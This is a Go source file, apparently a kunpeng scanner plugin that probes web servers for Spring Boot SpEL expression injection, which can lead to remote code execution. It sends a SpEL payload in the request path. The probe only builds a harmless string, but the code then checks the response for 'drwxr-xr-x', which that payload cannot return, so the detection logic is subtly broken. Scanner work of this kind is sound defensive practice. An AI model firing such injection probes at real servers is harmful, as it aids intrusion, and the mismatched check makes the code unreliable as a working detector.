package goplugin

import (
	"net/http"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type springBootRCE struct {
	info   plugin.PluginInfo
	result []plugin.PluginInfo
}

func init() {
	// plugin.Regist("all", &springBootRCE{})
}
func (d *springBootRCE) Init() plugin.PluginInfo{
	d.info = plugin.PluginInfo{
		Name:    "Spring Boot 框架表达式注入",
		Remarks: "Spring Boot框架的SpEL表达式注入，攻击者可在服务器上执行任意命令",
		Level:   0,
		Type:    "RCE",
		Author:   "wolf",
		References: plugin.References{
			URL: "",
			CVE: "",
		},
	}
	return d.info
}
func (d *springBootRCE) GetResult() []plugin.PluginInfo {
	return d.result
}
func (d *springBootRCE) Check(URL string, meta plugin.TaskMeta) bool {
	// var checkURL string
	// for _, url := range FileList {
	// 	if strings.Contains(url, ".cgi") {
	// 		checkURL = url
	// 		break
	// 	}
	// }
	// if checkURL == "" {
	// 	return false
	// }
	poc := "${new java.lang.String(new byte[]{97,98,99,100,101})}."
	request, err := http.NewRequest("GET", URL+"/"+poc, nil)
	// request.Header.Set("cookie", poc)
	// request.Header.Set("User-Agent", poc)
	// request.Header.Set("Referrer", poc)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
